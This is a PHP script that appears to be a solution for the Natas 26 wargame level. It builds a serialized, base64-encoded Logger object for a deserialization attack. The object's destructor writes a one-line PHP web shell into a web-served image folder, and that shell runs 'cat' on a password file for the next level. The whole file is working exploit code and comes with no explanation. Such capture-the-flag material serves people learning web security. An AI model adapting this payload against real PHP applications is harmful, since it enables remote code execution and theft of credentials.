<?php
error_reporting(0);
	class Logger{
		private $logFile;
		private $initMsg;
		private $exitMsg;
	      
		function __construct($file){
		    // initialise variables
		    $this->initMsg="#--session started--#\n";
		    $this->exitMsg="<?php passthru(\"cat /etc/natas_webpass/natas27\") ?>"; 
		    $this->logFile = "img/natas26_tald.php";
	      
		    // write initial message
		    $fd=fopen($this->logFile,"a+");
		    fwrite($fd,$initMsg);
		    fclose($fd);
		}                       
	      
		function log($msg){
		    $fd=fopen($this->logFile,"a+");
		    fwrite($fd,$msg."\n");
		    fclose($fd);
		}                       
	      
		function __destruct(){
		    // write exit message
		    $fd=fopen($this->logFile,"a+");
		    fwrite($fd,$this->exitMsg);
		    fclose($fd);
		}                       
	    }
	$obj = new Logger("tald");
	echo base64_encode(serialize($obj));
?>
